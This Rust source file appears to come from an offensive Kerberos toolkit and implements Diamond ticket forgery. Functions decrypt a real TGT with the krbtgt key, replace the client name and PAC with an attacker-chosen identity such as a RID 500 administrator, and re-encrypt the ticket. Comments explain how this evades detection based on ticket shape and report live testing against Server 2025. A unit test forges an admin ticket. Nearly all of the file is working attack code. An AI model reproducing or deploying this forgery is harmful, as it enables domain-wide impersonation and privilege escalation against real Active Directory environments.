//! Diamond ticket forgery.
//!
//! # Why not just Golden?
//!
//! Golden tickets are cheap to detect by shape: an `EncTicketPart` built from scratch with
//! rounded 10-year lifetimes, a synthesized session key, `transited = 0`, and PAC fields that
//! never match what a real KDC would emit. Diamond takes a **real** TGT (you needed krbtgt to
//! make a Golden anyway — same key here) and only swaps the identity-carrying PAC + cname,
//! inheriting the real ticket's flags / times / session key — shrinking wire-shape fingerprints
//! considerably.
//!
//! **Detection on patched DCs.** KB5020805-era PAC-consistency checks catch the residual
//! mismatch between the inherited template timestamps and the swapped-in PAC_REQUESTOR /
//! PAC_CLIENT_INFO identity (live-tested on Server 2025: DC decrypts the ticket and then
//! rejects with KDC_ERR_TGT_REVOKED). Treat Diamond as a shape-stealth optimization that
//! degrades to Golden on fully-patched modern DCs, not a detection bypass.
//!
//! 1.5.3: rebuilt on kerbcore (was picky-krb). Note kerbcore's ticket parser does not surface
//! `transited` (dropped as raw), so the rebuilt ticket carries an empty transited — the
//! KDC-issued norm for a same-realm TGT; a cross-realm `transited` is not preserved.

use crate::forge::{build_enc_ticket_part, build_pac_authdata, ForgedTicket};
use crate::pac::{assemble_pac, decrypt_ticket_pac_aes256, decrypt_ticket_pac_rc4, ForgeIdentity};
use crate::util::{principal, ETYPE_AES256, ETYPE_RC4_HMAC, NT_PRINCIPAL, NT_SRV_INST};
use crate::Result;

/// Forge a **Diamond** ticket: identity swap on a real TGT.
///
/// Decrypts `real_ticket_cipher` with `krbtgt_key`, keeps the recovered `EncTicketPart`'s
/// flags / session key / times, and rebuilds the PAC from `new_identity` signed under the same
/// key. Re-encrypts and returns a full `Ticket` addressed to `krbtgt/REALM`.
pub fn forge_diamond_tgt(
    real_ticket_cipher: &[u8],
    krbtgt_key: &[u8],
    new_identity: &ForgeIdentity,
    realm: &str,
    rc4: bool,
) -> Result<ForgedTicket> {
    let (etp, _old_pac) = if rc4 {
        decrypt_ticket_pac_rc4(real_ticket_cipher, krbtgt_key)?
    } else {
        decrypt_ticket_pac_aes256(real_ticket_cipher, krbtgt_key)?
    };
    let new_pac = assemble_pac(new_identity, krbtgt_key, krbtgt_key, rc4)?;
    build_diamond_ticket(etp, new_pac, krbtgt_key, realm, rc4, new_identity)
}

/// Rebuild a decrypted `EncTicketPart`'s authorization-data with `new_pac` + identity, re-encrypt
/// under `ticket_key`, and wrap in a fresh `Ticket` addressed to `krbtgt/REALM`. Exposed for
/// callers that already have a decrypted `EncTicketPart` (e.g. a Sapphire-style S4U2Self pipeline).
pub fn build_diamond_ticket(
    etp: kerbcore::acceptor::EncTicketPart,
    new_pac: Vec<u8>,
    ticket_key: &[u8],
    realm: &str,
    rc4: bool,
    new_identity: &ForgeIdentity,
) -> Result<ForgedTicket> {
    let realm_up = realm.to_uppercase();
    let etype = if rc4 { ETYPE_RC4_HMAC } else { ETYPE_AES256 };

    // Preserve the real ticket's session key + flags + timestamps; swap only identity + PAC.
    let session_key = etp.key.keyvalue.clone();
    let cname = principal(NT_PRINCIPAL, &[new_identity.user.as_str()]);
    let starttime = etp
        .starttime
        .clone()
        .unwrap_or_else(|| etp.authtime.clone());
    let renew_till = etp
        .renew_till
        .clone()
        .unwrap_or_else(|| etp.endtime.clone());
    let authdata = build_pac_authdata(&new_pac);

    let enc = build_enc_ticket_part(
        etype,
        &session_key,
        &realm_up,
        &cname,
        etp.flags,
        &etp.authtime,
        &starttime,
        &etp.endtime,
        &renew_till,
        &authdata,
        ticket_key,
    )?;

    let ticket = kerbcore::messages::Ticket {
        tkt_vno: 5,
        realm: realm_up.clone(),
        sname: principal(NT_SRV_INST, &["krbtgt", &realm_up]),
        enc_part: kerbcore::types::EncryptedData {
            etype: etype as i32,
            kvno: None,
            cipher: enc,
        },
    };

    Ok(ForgedTicket::from_parts(
        ticket,
        session_key,
        cname,
        realm_up,
    ))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::forge::build_enc_ticket_part;
    use crate::pac::{assemble_pac, decrypt_ticket_pac_aes256, ForgeIdentity};

    fn sample_id(user: &str, rid: u32) -> ForgeIdentity {
        ForgeIdentity {
            user: user.into(),
            rid,
            primary_gid: 513,
            group_rids: vec![513],
            domain_subauths: vec![21, 100, 200, 300],
            logon_server: "DC".into(),
            logon_domain: "T".into(),
            extra_sids: vec![],
        }
    }

    #[test]
    fn diamond_preserves_nondefault_flags() {
        let krbtgt = [0xb7u8; 32];
        let alice = sample_id("alice", 1234);
        let admin = sample_id("admin", 500);

        let pac = assemble_pac(&alice, &krbtgt, &krbtgt, false).unwrap();
        let authdata = crate::forge::build_pac_authdata(&pac);
        let now = crate::util::now_kerberos_time();

        // 0x60e50000 = FORWARDABLE | PROXIABLE | RENEWABLE | INITIAL | PRE-AUTHENT | OK-AS-DELEGATE
        let custom_flags: u32 = 0x60e5_0000;

        let mut sk = [0u8; 32];
        rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut sk);
        let enc = build_enc_ticket_part(
            ETYPE_AES256,
            &sk,
            "TEST.LOCAL",
            &principal(NT_PRINCIPAL, &["alice"]),
            custom_flags,
            &now,
            &now,
            crate::util::FAR_FUTURE,
            crate::util::FAR_FUTURE,
            &authdata,
            &krbtgt,
        )
        .unwrap();

        let ticket_cipher = &enc;
        let diamond = forge_diamond_tgt(ticket_cipher, &krbtgt, &admin, "TEST.LOCAL", false)
            .expect("diamond forge");

        let (etp, _pac) =
            decrypt_ticket_pac_aes256(diamond.ticket_cipher(), &krbtgt).expect("diamond decrypt");
        assert_eq!(
            etp.flags, custom_flags,
            "diamond must preserve the template's non-default TicketFlags, got {:#010x}",
            etp.flags
        );
    }
}
